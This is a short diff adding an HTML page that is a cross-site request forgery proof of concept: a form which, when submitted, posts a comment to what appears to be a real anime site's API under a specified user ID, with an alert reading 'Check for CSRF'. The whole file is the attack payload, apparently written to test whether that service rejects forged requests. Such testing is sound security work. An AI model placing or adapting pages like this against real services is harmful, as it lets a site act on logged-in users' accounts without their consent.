@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+
+<html>
+    <head>
+        <link rel="stylesheet" href="css/style.css">
+    </head>
+
+    <body>
+        <form onsubmit="alert('Check for CSRF')" method="post" action="https://api.aninetapi.com/api/Comments?animeId=16498&userId=761380&text=CSRF&translation=ru&ContainsSpoilers=false">
+            <input type="submit" value="CSRF!" />
+        </form>
+    </body>
+</html>
